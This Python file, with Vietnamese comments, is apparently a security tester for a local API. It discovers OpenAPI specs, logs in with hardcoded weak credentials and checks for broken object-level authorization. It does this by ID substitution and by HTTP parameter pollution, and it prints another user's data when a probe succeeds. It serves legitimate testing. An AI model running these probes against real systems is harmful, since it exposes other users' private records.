import requests
import re
from api_client import APIClient

url = "http://127.0.0.1:8000"
open_api = "http://127.0.0.1:8000/openapi.json"

login_admin = {
    "username":"admin",
    "password":"password"
}
login_user_1 = {
    "username":"duynt",
    "password":"duynt"
}

class MyTester(APIClient):

    def hien_thi_log(self, method, url, response):
        """
        Ghi đè hàm log gốc để nó không in ra cái cục JSON khổng lồ nữa.
        Chỉ in ra kết quả rút gọn cho dễ nhìn.
        """
        # Nếu đang tải file openapi thì tắt log im bặt luôn
        if "openapi.json" in url or "swagger.json" in url:
            return 

        # Với các endpoint test bình thường, chỉ in log rút gọn 1 dòng
        print(f"  [>] {method} {url} | Status: {response.status_code}")


    #Post với data là data= (Dành cho chuảan Oauth2)
    def post_data(self, endpoint, form_data):
        # Đổi header tạm thời cho chuẩn OAuth2
        self.session.headers.update({"Content-Type": "application/x-www-form-urlencoded"})
        
        # Dùng kwargs để đẩy data vào
        res = self._xu_ly_yeu_cau("POST", endpoint, data=form_data)
        
        # Trả lại header cũ cho anh em khác dùng
        self.session.headers.update({"Content-Type": "application/json"})
        return res
    #Dò file openapi.json
    def find_api(self,base_url):
        pos_path = [
            "/openapi.json",
            "/swagger.json",
            "/api/swagger.json",
            "/v1/swagger.json",
            "/v2/api-docs",
            "/v3/api-docs",
            "/docs/openapi.json",
            "/api-docs",
            "/v2/swagger.json",
            "/v3/swagger.json"
        ]

        for path in pos_path:
            scan_url = f"{base_url}{path}"
            print(scan_url)
            try:
                check = self.get(path)
                
                if check.status_code == 200:
                    try:
                        data = check.json()

                        if "openapi"in data or "swagger" in data:
                            return path
                    except ValueError:
                        pass
            except Exception:
                   pass
        print("ko co cai file nao ca T-T")
        return None

    #Đăng nhập để lưu token cho các lần test sau 
    def login(self,login_data):
        res = self.post_data("/token",login_data)

        if res.status_code == 200:
            token = res.json().get("access_token")

            if token:

                self.gan_token(token)
                print("Luu token thanh cong")

            else:
                print("Không có token")
        else:
            print("sai tên đăng nhập hoặc mật khẩu")
        return token

    #Lấy endpoint ra (dùng cho chuẩn swagger v3)
    #Chỉ lấy các endpoint với method != Get để đẩy thông tin lên
    #Output có dạng là {endpoint} + {method} : {schema}
    def get_endpoint_map(self):
        api_path = self.find_api(self.base_url) 
        if not api_path:
            return {}
            
        data = self.get(api_path).json()
        paths = data.get("paths", {})
        mapping = {}

        for path, methods in paths.items():
            for method, detail in methods.items():
                if method.lower() == "get":
                    continue
                
                body = detail.get("requestBody", {})
                content = body.get("content", {})
                for app, schema_info in content.items():
                    schema = schema_info.get("schema", {})
                    ref = schema.get("$ref")
                    if ref:
                        schema_name = ref.split("/")[-1]
                        mapping[f"{path.lower()} {method}"] = schema_name
                
        return mapping
    

    #Lấy ra các trường cần thiết cho từng endpoint cũng như định dạng của trường
    #Định dạng in ra sẽ là json ví dụ : {'Schema_name' : {'username' : {'type': 'string','format' : 'None'}}}
    def get_component_map(self):
            data = self.get(self.find_api(self.base_url)).json()
            components = data.get("components",{})
            schemas = components.get("schemas",{})

            map = {}
            require_map = {}
            for component,schema_content in schemas.items():
                property = schema_content.get("properties")
                require = schema_content.get("required")
                require_map[component] = require
                tmp_map = {}
                current_map = {}
                if property:
                    for field_name,field_info in property.items():
                        for key,value in require_map.items():
                            if value is not None:
                                if field_name in value:
                                    current_map = {
                                        "type": f"{field_info.get("type")}",
                                        "format": f"{field_info.get("format")}"
                                    }
                        tmp_map[field_name] = current_map
                map[component] = tmp_map     
            return map

    
    def load_wordlist(self,file_path):
        try:
            wordlist = []
            with open(file_path,'r',encoding = 'utf-8') as file:
                for line in file.readlines():
                    pwd = line.strip()
                    if pwd:
                        wordlist.append(pwd)
                return wordlist
        except FileNotFoundError:
            print("Loi roi @@")
            return []


    def all_endpoint(self):
        api_path = self.find_api(self.base_url) 
        if not api_path:
            return {}
            
        data = self.get(api_path).json()
        paths = data.get("paths", {})

            
        return list(paths.keys())
    
    #hpp là http parameter pollution thêm các tham số rác trên request để backend lỗi
    #mục tiêu là để server đọc 1 tham số và truy vấn 1 tham số khác
    #Ví dụ: 101?user_id=104 -> Lúc đầu đọc thấy id 101 ok chuẩn với token xong thấy id 104 ok truy vấn data của id 104 --> bola thành công 
    def BOLA_hpp(self):
        data_test = self.doc_file_json("data/test_data.json")
        
        for part in data_test:
            if part["id"] != 13:
                continue

            test_case = part["payloads"]
            token_u1 = self.login(login_user_1)
            for case in test_case:
                my_id = case["my_id"]
                target_id = case["target_id"]
                print(f"Dang test:{case["description"]}")

                endpoints = self.all_endpoint()

                for end in endpoints:
                    #Sử dụng re(regular express) biểu thức chính quy để lấy mục id trong endpoint
                    #\{} bắt đầu kết thức bằng ngoặc nhọn
                    #[^}]* để lấy bất kì chữ nào ngoại trừ dấu ngoặc nhọn
                    #output lấy các trường id
                    match = re.search(r'\{([^}]*id[^}]*)\}',end,re.IGNORECASE)
                    #Nếu có endpoint chứa id tạo header với token của người dùng đã cung cấp để test
                    if match:
                        header = {
                            "Authorization" : f"Bearer {token_u1}"
                        }
                        #.group là phương thức của match cụ thể là phần re với ():
                        # group(0) là để lấy nguyên ngoặc nhọn ví dụ: {user_id}
                        #group(1) là để lấy phần ruột không ngoặc nhọn: user_id
                        param_ngoac = match.group(0)
                        param_name = match.group(1)

                        #Tạo url mục tiêu, thay thế phần {user_id} thành id?user_id= target_id
                        target_endpoint = end.replace(param_ngoac,str(my_id) + f"?{param_name}={target_id}")
                        try:
                            shoot = self._xu_ly_yeu_cau("GET",target_endpoint,headers= header)

                            if shoot.status_code == 200:
                                if str(target_id) in shoot.text and str(my_id) not in shoot.text:
                                    print("Success! System has bola threat by hpp method")
                                    print(shoot.text)
                                else:
                                    print("Failed! Can't access the target_id ")
                            else:
                                print("Failed! System is against bola with hpp method")
                        except Exception as e:
                            print(f"Loi roi {e}")



    def BOLA_classic(self):
        data_test = self.doc_file_json("data/test_data.json")
        for part in data_test:
            if part["id"] != 13:
                continue

            test_case = part["payloads"]
            token_u1 = self.login(login_user_1)
            for case in test_case:
                target_id = case["target_id"]
                my_id = case["my_id"]
                print(f"Dang test {case["description"]}")


                endpoints = self.all_endpoint()
                for end in endpoints:
                    match = re.search(r'\{([^}]*id[^}]*)\}',end,re.IGNORECASE)

                    if match:
                        header = {
                            "Authorization":f"Bearer {token_u1}"
                        }

                        param_ngoac = match.group(0)

                        target_end = end.replace(param_ngoac,str(target_id))
                        try:
                            
                            shoot = self._xu_ly_yeu_cau("GET",target_end,headers = header)

                            if shoot.status_code == 200:
                                if str(target_id) in shoot.text and str(my_id) not in shoot.text:
                                    print("Success! System has Bola with classic way")
                                    print(shoot.text)
                                else:
                                    print("Failed! System is immune to bola with classic way")
                            else:
                                print("Failed! System is immune to bola with classic way")
                        except Exception as e:
                            print(f"Co loi {e}")




            
    


if __name__ == "__main__":
    # Những code nằm trong này CHỈ CHẠY khi bạn bấm nút "Run" trực tiếp file này.
    # Khi Lead Hiếu import file này sang file khác, đoạn code này sẽ NGỦ YÊN.
    
    url_test = "http://127.0.0.1:8000"
    print(f"[*] Đang khởi chạy test nội bộ trên {url_test}...")
    
    tool = MyTester(url_test)
    
    print("\n--- TEST BOLA CLASSIC ---")
    tool.BOLA_classic()
